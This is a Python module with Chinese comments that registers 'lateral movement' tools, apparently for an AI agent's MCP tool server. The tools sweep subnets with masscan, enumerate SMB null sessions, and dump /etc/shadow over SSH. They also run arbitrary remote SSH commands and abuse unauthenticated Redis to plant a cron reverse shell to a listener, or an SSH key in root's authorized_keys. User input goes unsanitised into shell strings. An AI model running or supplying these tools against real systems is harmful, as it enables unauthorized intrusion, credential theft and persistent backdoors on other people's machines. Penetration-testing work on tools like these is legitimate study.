#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""横向移动工具 — 内网探测、凭证收集、远程执行"""
from mcp_runner_helper import run_cmd

def _register(reg):
    reg({
        "name": "lateral_portscan",
        "description": "内网存活主机快速探测（网段扫描）",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP或网段（如 192.168.1.0/24），支持target兼容"},
    "subnet": {"type": "string", "description": "目标网段（留空则用target参数），如 192.168.1.0/24"},
    "ports": {"type": "string", "description": "扫描端口，默认 1-65535 全端口；扫整段时建议显式收窄，全端口 ×256 台主机是很久的事", "default": "1-65535"},
    "rate": {"type": "integer", "description": "速率(包/秒)", "default": 5000}
},
                      "required": ["target"]},
    })(tool_lateral_portscan)
    reg({
        "name": "lateral_smb_enum",
        "description": "SMB枚举：共享目录、用户列表、空会话检测",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP"},
    "username": {"type": "string", "description": "用户名（空=空会话）", "default": ""},
    "password": {"type": "string", "description": "密码", "default": ""}
},
                      "required": ["target"]},
    })(tool_lateral_smb_enum)
    reg({
        "name": "lateral_hash_dump",
        "description": "凭证收集：从Linux(/etc/shadow)或Windows(SAM)提取哈希",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP（已getshell）"},
    "mode": {"type": "string", "description": "linux=读取/etc/shadow, windows=读取SAM, samdump=从注册表dumpsam", "default": "linux"},
    "username": {"type": "string", "description": "SSH用户名或Win用户名"},
    "password": {"type": "string", "description": "登录密码"},
    "port": {"type": "integer", "description": "SSH端口", "default": 22}
},
                      "required": ["target", "mode"]},
    })(tool_lateral_hash_dump)
    reg({
        "name": "lateral_ssh_exec",
        "description": "SSH远程命令执行（需已有凭据）",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP"},
    "username": {"type": "string", "description": "SSH用户名"},
    "password": {"type": "string", "description": "SSH密码"},
    "command": {"type": "string", "description": "要执行的命令", "default": "whoami"},
    "port": {"type": "integer", "description": "SSH端口", "default": 22}
},
                      "required": ["target", "username", "password"]},
    })(tool_lateral_ssh_exec)
    reg({
        "name": "lateral_redis_backdoor",
        "description": "Redis未授权访问 + SSH密钥植入（后门安装）",
        "inputSchema": {"type": "object",
                      "properties": {
    "target": {"type": "string", "description": "目标IP"},
    "action": {"type": "string", "description": "write_cron=写定时任务反弹, write_ssh=写SSH密钥, info=仅查看信息", "default": "info"},
    "lhost": {"type": "string", "description": "反弹shell的监听IP（action=write_cron时需要）"},
    "lport": {"type": "integer", "description": "监听端口", "default": 4444}
},
                      "required": ["target"]},
    })(tool_lateral_redis_backdoor)


# 内网存活主机探测 — 用masscan做网段扫描
def tool_lateral_portscan(name, params):
    subnet = params.get("target", "") or params.get("subnet", "")
    ports = params.get("ports", "1-65535") or "1-65535"
    rate = params.get("rate", 5000)
    if not subnet:
        return {"success": True, "returncode": 0, "output": "请指定目标IP或网段，如192.168.1.0/24"}
    return run_cmd(f"masscan {subnet} -p{ports} --rate={rate} -oL - 2>&1", 120)


# SMB枚举
def tool_lateral_smb_enum(name, params):
    target = params.get("target", "")
    username = params.get("username", "")
    password = params.get("password", "")
    if not target:
        return {"success": True, "returncode": 0, "output": "请指定目标IP"}

    results = []
    # smbmap枚举
    cmd = f"smbmap -H {target}"
    if username:
        cmd += f" -u {username}"
    if password:
        cmd += f" -p '{password}'"
    else:
        cmd += " -u '' -p ''"
    r1 = run_cmd(cmd + " 2>&1", 30)
    results.append(f"SMB共享枚举:\n{r1.get('output','') if isinstance(r1,dict) else str(r1)}")

    # smbclient空会话
    r2 = run_cmd(f"smbclient -L //{target}/ -N 2>&1 | head -30", 15)
    results.append(f"空会话枚举:\n{r2.get('output','') if isinstance(r2,dict) else str(r2)}")

    return {"success": True, "returncode": 0, "output": "\n---\n".join(results)}


# 凭证收集
def tool_lateral_hash_dump(name, params):
    target = params.get("target", "")
    mode = params.get("mode", "linux")
    username = params.get("username", "root")
    password = params.get("password", "")
    port = params.get("port", 22)

    if mode == "linux":
        if not password:
            return {"success": True, "returncode": 0, "output": "需要SSH密码才能读取/etc/shadow"}
        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{target} 'cat /etc/shadow && echo === && cat /etc/passwd && echo === && id' 2>&1"
        r = run_cmd(cmd, 30)
        return {"success": True, "returncode": 0, "output": f"=== 凭证收集: {target} Linux ===\n{r.get('output','') if isinstance(r,dict) else str(r)}"}

    elif mode in ("windows", "samdump"):
        return {"success": True, "returncode": 0,
                "output": "Windows哈希提取需要impacket，请使用 impacket_secretsdump 工具:\nimpacket_secretsdump target=IP domain=WORKGROUP username=user password=pass"}

    return {"success": True, "returncode": 0, "output": f"未知模式: {mode}"}


# SSH远程执行
def tool_lateral_ssh_exec(name, params):
    target = params.get("target", "")
    username = params.get("username", "")
    password = params.get("password", "")
    command = params.get("command", "whoami")
    port = params.get("port", 22)

    if not password:
        return {"success": True, "returncode": 0, "output": "需要SSH密码"}

    result = run_cmd(f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{target} '{command}' 2>&1", 30)
    output = result.get("output", "") if isinstance(result, dict) else str(result)
    return {
        "success": True, "returncode": 0,
        "output": f"=== SSH远程执行: {username}@{target}:{port} ===\n命令: {command}\n\n{output}"
    }


# Redis未授权
def tool_lateral_redis_backdoor(name, params):
    target = params.get("target", "")
    action = params.get("action", "info")
    lhost = params.get("lhost", "")
    lport = params.get("lport", 4444)

    lines = [f"=== Redis: {target} ==="]

    # 先检查redis是否可达
    check = run_cmd(f"timeout 5 redis-cli -h {target} PING 2>&1", 8)
    check_out = check.get('output','') if isinstance(check,dict) else str(check)
    if "PONG" not in check_out and "pong" not in check_out.lower():
        lines.append(f"[跳过] {target} 未开放Redis服务（PING无响应）")
        return {"success": True, "returncode": 0, "output": "\n".join(lines)}

    if action == "info":
        r = run_cmd(f"redis-cli -h {target} INFO 2>&1 | head -30", 10)
        lines.append(f"INFO:\n{r.get('output','') if isinstance(r,dict) else str(r)}")
        r2 = run_cmd(f"redis-cli -h {target} CONFIG GET requirepass 2>&1", 10)
        lines.append(f"密码检查:\n{r2.get('output','') if isinstance(r2,dict) else str(r2)}")

    elif action == "write_cron" and lhost:
        r = run_cmd(
            f"redis-cli -h {target} SET x '\\n* * * * * bash -c \\\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\\"\\n' 2>&1"
            f" && redis-cli -h {target} CONFIG SET dir /var/spool/cron/ 2>&1"
            f" && redis-cli -h {target} CONFIG SET dbfilename root 2>&1"
            f" && redis-cli -h {target} BGSAVE 2>&1", 30)
        lines.append(f"crontab反弹结果:\n{r.get('output','') if isinstance(r,dict) else str(r)}")

    elif action == "write_ssh":
        key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ..."
        r = run_cmd(
            f"redis-cli -h {target} SET sshkey '\\n\\n{key}\\n\\n' 2>&1"
            f" && redis-cli -h {target} CONFIG SET dir /root/.ssh/ 2>&1"
            f" && redis-cli -h {target} CONFIG SET dbfilename authorized_keys 2>&1"
            f" && redis-cli -h {target} BGSAVE 2>&1", 30)
        lines.append(f"SSH密钥安装结果:\n{r.get('output','') if isinstance(r,dict) else str(r)}")

    return {"success": True, "returncode": 0, "output": "\n".join(lines)}
